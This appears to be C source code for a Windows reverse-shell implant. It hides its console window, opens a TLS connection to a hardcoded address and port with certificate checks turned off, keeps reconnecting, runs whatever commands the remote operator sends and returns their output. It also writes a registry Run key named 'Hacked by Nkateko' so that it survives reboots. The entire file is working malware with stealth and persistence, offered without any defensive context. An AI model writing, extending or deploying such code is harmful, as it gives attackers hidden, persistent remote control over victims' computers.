#define SECURITY_WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdbool.h>
#include <security.h>
#include <schannel.h>
#include <stdio.h>


//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "Secur32.lib")



#define PORT 50505
#define ADDR "192.168.2.2"
#define BUFFER 2048
#define max_response 20000

SOCKET sock = INVALID_SOCKET;
CredHandle hCred;
CtxtHandle hCtxt;
SecPkgContext_StreamSizes streamSizes;


int schannel_recv(char *buffer, int buffer_len) {
    char encrypted[4096];
    SecBuffer secBuffers[4];
    SecBufferDesc secBufferDesc;
    SECURITY_STATUS status;

    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
    if (bytesRead <= 0) return -1;

    secBuffers[0].BufferType = SECBUFFER_DATA;
    secBuffers[0].pvBuffer = encrypted;
    secBuffers[0].cbBuffer = bytesRead;
    secBuffers[1].BufferType = SECBUFFER_EMPTY;
    secBuffers[2].BufferType = SECBUFFER_EMPTY;
    secBuffers[3].BufferType = SECBUFFER_EMPTY;

    secBufferDesc.cBuffers = 4;
    secBufferDesc.pBuffers = secBuffers;
    secBufferDesc.ulVersion = SECBUFFER_VERSION;

    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
    if (status != SEC_E_OK) return -1;

    for (int i = 0; i < 4; i++) {
        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
            memcpy(buffer, secBuffers[i].pvBuffer, min(buffer_len, secBuffers[i].cbBuffer));
            return secBuffers[i].cbBuffer;
        }
    }

    return -1;
}

int schannel_send(const char *data, int len) {
    char *message = malloc(streamSizes.cbHeader + len + streamSizes.cbTrailer);
    if (!message) return -1;

    SecBuffer buffers[3];
    SecBufferDesc desc;

    memcpy(message + streamSizes.cbHeader, data, len);

    buffers[0].pvBuffer = message;
    buffers[0].cbBuffer = streamSizes.cbHeader;
    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;

    buffers[1].pvBuffer = message + streamSizes.cbHeader;
    buffers[1].cbBuffer = len;
    buffers[1].BufferType = SECBUFFER_DATA;

    buffers[2].pvBuffer = message + streamSizes.cbHeader + len;
    buffers[2].cbBuffer = streamSizes.cbTrailer;
    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;

    desc.cBuffers = 3;
    desc.pBuffers = buffers;
    desc.ulVersion = SECBUFFER_VERSION;

    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
    if (status != SEC_E_OK) {
        free(message);
        return -1;
    }

    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
    int sent = send(sock, message, totalSize, 0);
    free(message);

    return sent;
}



int conn() {
    WSADATA wsaData;
    struct sockaddr_in serverAddress;
    SECURITY_STATUS ss;
    SCHANNEL_CRED schannel_cred = {0};
    SecBufferDesc OutBufferDesc;
    SecBuffer OutBuffers[1];
    DWORD OutFlags;
    TimeStamp tsExpiry;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = inet_addr(ADDR);

start_connect:
    if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        Sleep(30);
        goto start_connect;
    }

    schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
    schannel_cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    schannel_cred.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION;

    ss = AcquireCredentialsHandle(NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &schannel_cred, NULL, NULL, &hCred, &tsExpiry);
    if (ss != SEC_E_OK) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    OutBufferDesc.cBuffers = 1;
    OutBufferDesc.pBuffers = OutBuffers;
    OutBufferDesc.ulVersion = SECBUFFER_VERSION;
    OutBuffers[0].BufferType = SECBUFFER_TOKEN;
    OutBuffers[0].cbBuffer = 0;
    OutBuffers[0].pvBuffer = NULL;

    ss = InitializeSecurityContext(&hCred, NULL, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);
    if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED) {
        FreeCredentialsHandle(&hCred);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
        send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
        FreeContextBuffer(OutBuffers[0].pvBuffer);
    }

    do {
        SecBuffer InBuffer[1];
        SecBufferDesc InBufferDesc;

        InBuffer[0].BufferType = SECBUFFER_TOKEN;
        InBuffer[0].cbBuffer = 4096;
        InBuffer[0].pvBuffer = malloc(4096);
        if (!InBuffer[0].pvBuffer) return -1;

        int bytesRead = recv(sock, (char *)InBuffer[0].pvBuffer, 4096, 0);
        if (bytesRead <= 0) {
            free(InBuffer[0].pvBuffer);
            DeleteSecurityContext(&hCtxt);
            FreeCredentialsHandle(&hCred);
            closesocket(sock);
            WSACleanup();
            return -1;
        }
        InBuffer[0].cbBuffer = bytesRead;

        InBufferDesc.cBuffers = 1;
        InBufferDesc.pBuffers = InBuffer;
        InBufferDesc.ulVersion = SECBUFFER_VERSION;

        OutBufferDesc.cBuffers = 1;
        OutBufferDesc.pBuffers = OutBuffers;
        OutBufferDesc.ulVersion = SECBUFFER_VERSION;
        OutBuffers[0].BufferType = SECBUFFER_TOKEN;
        OutBuffers[0].cbBuffer = 0;
        OutBuffers[0].pvBuffer = NULL;

        ss = InitializeSecurityContext(&hCred, &hCtxt, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &InBufferDesc, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);

        free(InBuffer[0].pvBuffer);

        if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
            send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
            FreeContextBuffer(OutBuffers[0].pvBuffer);
        }

    } while (ss == SEC_I_CONTINUE_NEEDED);

    if (ss != SEC_E_OK) {
        DeleteSecurityContext(&hCtxt);
        FreeCredentialsHandle(&hCred);
        closesocket(sock);
        WSACleanup();
        return -1;
    }


    QueryContextAttributes(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &streamSizes);
    return 0;
}

int persist() {
    char error[256] = "Failed to create persistance \n";
    char success[256] = "Create persistance at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \n";
    TCHAR path[MAX_PATH]; 
    DWORD pathlen = GetModuleFileName(NULL, path, sizeof(path));
    if (pathlen == 0) {
        send(sock, error, sizeof(error), 0);
        return -1;
    }

    HKEY val;
    if (RegOpenKey(HKEY_CURRENT_USER, (LPCSTR)"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &val) != ERROR_SUCCESS) {
        send(sock, error, sizeof(error), 0);
        return -1;
    }

    DWORD pathlenInBytes = pathlen * sizeof(pathlen);
    if (RegSetValueEx(val, TEXT("Hacked by Nkateko"), 0, REG_SZ, (LPBYTE)path, pathlenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(val);
        send(sock, error, sizeof(error), 0);
        return -1;        
    }

    RegCloseKey(val);
    send(sock, success, sizeof(success), 0);
    return 0;
}

void shell() {
    char buffer[BUFFER];
    char container[BUFFER];
    char total_response[max_response];

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        memset(container, 0, sizeof(container));
        memset(total_response, 0 , sizeof(total_response));
        
        //recv(sock, buffer, sizeof(buffer), 0);
        schannel_recv(buffer, sizeof(buffer));

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else if (strncmp("persist", buffer, 7) == 0) {
            persist();
        } else if (strncmp("cd ", buffer, 3) == 0) {
            const char *path = buffer + 3;
            SetCurrentDirectoryA(path);
            snprintf(total_response, sizeof(total_response), "Changed directory to %s\n", path);
            //send(sock, total_response, sizeof(total_response), 0);
            schannel_send(total_response, strlen(total_response));
        } else {
            FILE *fp;
            char command_with_redirect[BUFFER + 10];
            snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", buffer);
            fp = _popen(command_with_redirect, "r");
            if (!fp) {
                const char *err = "Failed to execute command.\n";
                schannel_send(err, strlen(err));
                continue;
            }
        
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            schannel_send(total_response, strlen(total_response));
            fclose(fp);
        }
            /*
            FILE *fp;
            fp = _popen(buffer, "r");
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            //ssl_write
            //send(sock, total_response, sizeof(total_response), 0);
            schannel_send(total_response, strlen(total_response));
            fclose(fp);
        }*/
    }
}

void hideConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main() {
    hideConsole();
    while (true) {
        if (conn() != 0) exit(1);
        shell();
        Sleep(500);
    }
    return 0;
}
